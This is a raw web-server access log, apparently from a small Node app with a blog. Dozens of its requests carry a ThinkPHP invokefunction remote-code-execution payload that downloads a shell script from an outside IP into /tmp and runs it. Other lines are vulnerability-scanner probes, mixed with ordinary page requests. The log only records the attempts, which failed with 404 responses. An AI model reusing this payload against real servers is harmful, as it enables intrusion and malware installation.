[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.507 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.514 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.859 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.694 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.512 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.749 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.071 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.501 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.498 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.505 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.502 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.574 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.542 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.518 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m6.853 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.519 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.703 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.560 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.749 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m2.130 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.661 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.621 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.498 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.500 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.673 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.694 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.690 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.709 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.649 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.925 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.233 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.927 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.213 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.661 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.579 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.670 ms - 913[0m
[0mGET / [32m200 [0m0.741 ms - 2148[0m
[0mGET / [32m200 [0m0.724 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.663 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.485 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.510 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.707 ms - 913[0m
[0mGET / [32m200 [0m0.745 ms - 2148[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.678 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.647 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.667 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m0.999 ms - 913[0m
[0mGET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20/tmp;wget%20http://89.35.39.78/1.sh;chmod%20777%201.sh;sh%201.sh [33m404 [0m1.265 ms - 913[0m
[0mGET / [32m200 [0m0.739 ms - 2148[0m
[0mGET / [32m200 [0m0.722 ms - 2148[0m
[0mGET / [32m200 [0m0.730 ms - 2148[0m
[0mGET / [32m200 [0m0.705 ms - 2148[0m
[0mGET / [32m200 [0m0.812 ms - 2148[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET / [32m200 [0m0.743 ms - 2148[0m
[0mGET / [32m200 [0m0.716 ms - 2148[0m
[0mGET / [32m200 [0m0.759 ms - 2148[0m
[0mGET / [32m200 [0m0.736 ms - 2148[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.752 ms - 2148[0m
[0mGET / [32m200 [0m0.722 ms - 2148[0m
[0mGET / [32m200 [0m0.716 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.760 ms - 2148[0m
[0mGET / [32m200 [0m0.708 ms - 2148[0m
[0mGET / [32m200 [0m0.685 ms - 2148[0m
[0mGET / [32m200 [0m0.766 ms - 2148[0m
[0mGET / [32m200 [0m0.779 ms - 2148[0m
[0mGET / [32m200 [0m0.699 ms - 2148[0m
[0mGET / [32m200 [0m0.671 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m0.693 ms - 913[0m
[0mGET / [32m200 [0m0.751 ms - 2148[0m
[0mGET / [32m200 [0m1.033 ms - 2148[0m
[0mGET / [32m200 [0m0.721 ms - 2148[0m
[0mGET / [32m200 [0m40.738 ms - 2148[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET / [32m200 [0m0.638 ms - 2148[0m
[0mGET / [32m200 [0m0.724 ms - 2148[0m
[0mGET /mysql/admin/index.php?lang=en [33m404 [0m1.659 ms - 913[0m
[0mGET / [32m200 [0m0.741 ms - 2148[0m
[0mGET / [32m200 [0m0.709 ms - 2148[0m
[0mGET / [32m200 [0m0.779 ms - 2148[0m
[0mGET / [32m200 [0m0.693 ms - 2148[0m
[0mGET / [32m200 [0m0.691 ms - 2148[0m
[0mGET /v1/agent/self [33m404 [0m0.751 ms - 913[0m
[0mGET / [32m200 [0m0.746 ms - 2148[0m
[0mGET / [32m200 [0m0.740 ms - 2148[0m
[0mGET / [32m200 [0m0.755 ms - 2148[0m
[0mGET / [32m200 [0m0.668 ms - 2148[0m
[0mGET / [32m200 [0m0.710 ms - 2148[0m
[0mGET / [32m200 [0m0.716 ms - 2148[0m
[0mGET / [32m200 [0m0.704 ms - 2148[0m
[0mGET /a2billing/customer/templates/default/footer.tpl [33m404 [0m0.738 ms - 913[0m
[0mGET /recordings/ [33m404 [0m0.654 ms - 913[0m
[0mGET / [32m200 [0m0.687 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.701 ms - 913[0m
[0mGET /vtigercrm/vtigerservice.php [33m404 [0m0.689 ms - 913[0m
[0mPOST / [33m404 [0m2.921 ms - 913[0m
[0mGET / [32m200 [0m0.683 ms - 2148[0m
[0mGET / [32m200 [0m0.770 ms - 2148[0m
[0mGET / [32m200 [0m0.732 ms - 2148[0m
[0mGET / [32m200 [0m0.809 ms - 2148[0m
[0mGET / [32m200 [0m0.697 ms - 2148[0m
[0mGET / [32m200 [0m0.705 ms - 2148[0m
[0mGET / [32m200 [0m0.738 ms - 2148[0m
[0mGET / [32m200 [0m0.765 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.721 ms - 2148[0m
[0mGET / [32m200 [0m0.767 ms - 2148[0m
[0mGET / [32m200 [0m0.771 ms - 2148[0m
[0mGET / [32m200 [0m0.788 ms - 2148[0m
[0mGET / [32m200 [0m3.993 ms - 2148[0m
[0mGET / [32m200 [0m0.745 ms - 2148[0m
[0mGET / [32m200 [0m0.609 ms - 2148[0m
[0mGET / [32m200 [0m0.717 ms - 2148[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [32m200 [0m0.692 ms - 2148[0m
[0mGET / [32m200 [0m0.743 ms - 2148[0m
[0mGET / [32m200 [0m0.778 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET / [32m200 [0m0.705 ms - 2148[0m
[0mGET / [32m200 [0m11.263 ms - 2148[0m
[0mGET / [32m200 [0m0.691 ms - 2148[0m
[0mGET / [32m200 [0m0.773 ms - 2148[0m
[0mGET / [32m200 [0m0.744 ms - 2148[0m
[0mGET / [32m200 [0m0.776 ms - 2148[0m
[0mGET / [32m200 [0m0.698 ms - 2148[0m
[0mGET / [32m200 [0m0.737 ms - 2148[0m
[0mGET / [32m200 [0m0.762 ms - 2148[0m
[0mGET / [36m304 [0m9.804 ms - -[0m
[0mGET /blog [32m200 [0m2.837 ms - 1981[0m
[0mGET / [32m200 [0m0.769 ms - 2148[0m
[0mGET / [32m200 [0m0.810 ms - 2148[0m
[0mGET / [32m200 [0m23.312 ms - 2148[0m
[0mGET / [32m200 [0m0.717 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m9.327 ms - 913[0m
[0mGET /blog [32m200 [0m2.706 ms - 1981[0m
[0mGET /blog/addBlog [32m200 [0m2.907 ms - 1948[0m
[0mGET /blog [36m304 [0m0.780 ms - -[0m
[0mGET / [36m304 [0m0.770 ms - -[0m
[0mGET / [32m200 [0m0.717 ms - 2148[0m
[0mGET / [32m200 [0m0.697 ms - 2148[0m
[0mGET / [32m200 [0m0.710 ms - 2148[0m
[0mGET /favicon.ico [33m404 [0m0.734 ms - 913[0m
[0mGET /blog [32m200 [0m0.666 ms - 1981[0m
[0mGET /blog/addBlog [32m200 [0m0.676 ms - 1948[0m
[0mGET / [32m200 [0m2.131 ms - 2148[0m
[0mGET / [36m304 [0m0.851 ms - -[0m
[0mGET /blog [36m304 [0m0.792 ms - -[0m
[0mGET /blog/addBlog [32m200 [0m0.747 ms - 1948[0m
[0mGET /blog [36m304 [0m0.728 ms - -[0m
[0mGET / [36m304 [0m0.741 ms - -[0m
[0mGET / [32m200 [0m0.750 ms - 2148[0m
[0mGET / [36m304 [0m0.800 ms - -[0m
[0mGET / [36m304 [0m0.753 ms - -[0m
[0mGET / [36m304 [0m0.718 ms - -[0m
[0mGET /blog [36m304 [0m0.750 ms - -[0m
[0mGET /blog/addBlog [36m304 [0m0.724 ms - -[0m
[0mGET /blog [36m304 [0m0.717 ms - -[0m
[0mGET / [36m304 [0m1.115 ms - -[0m
